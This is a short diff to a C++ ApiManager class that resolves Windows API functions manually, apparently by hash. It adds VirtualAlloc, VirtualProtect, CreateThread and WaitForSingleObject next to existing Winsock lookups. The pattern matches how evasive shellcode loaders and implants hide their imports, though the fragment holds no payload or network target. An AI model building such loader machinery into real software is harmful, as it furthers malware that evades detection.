@@ -75,6 +75,7 @@ FARPROC ApiManager::GetProcAddressManual(HMODULE hModule, DWORD procHash)
     return nullptr;
 }
 
+// TODO: load hashes then loadapis?
 void ApiManager::loadAPIs()
 {
     // TODO: hardcoded hModule names 
@@ -93,11 +94,13 @@ void ApiManager::loadAPIs()
     fProcedures_["WSACleanup"] = GetProcAddressManual(hModules_[L"ws2_32.dll"], "WSACleanup");
 
     // WinApi functions (kernel32.dll)
-    // VirtualAlloc
-    // VirtualProtect
-    // CreateThread
-    // WaitForSingleObject
+    fProcedures_["VirtualAlloc"] = GetProcAddressManual(hModules_[L"kernel32.dll"], "VirtualAlloc");
+    fProcedures_["VirtualProtect"] = GetProcAddressManual(hModules_[L"kernel32.dll"], "VirtualProtect");
+    fProcedures_["CreateThread"] = GetProcAddressManual(hModules_[L"kernel32.dll"], "CreateThread");
+    fProcedures_["WaitForSingleObject"] = GetProcAddressManual(hModules_[L"kernel32.dll"], "WaitForSingleObject");
 
     // (ntdll.dll)
     // LdrLoadDll
+    fProcedures_["RtlGetVersion"] = GetProcAddressManual(hModules_[L"ntdll.dll"], "RtlGetVersion");
+
 }
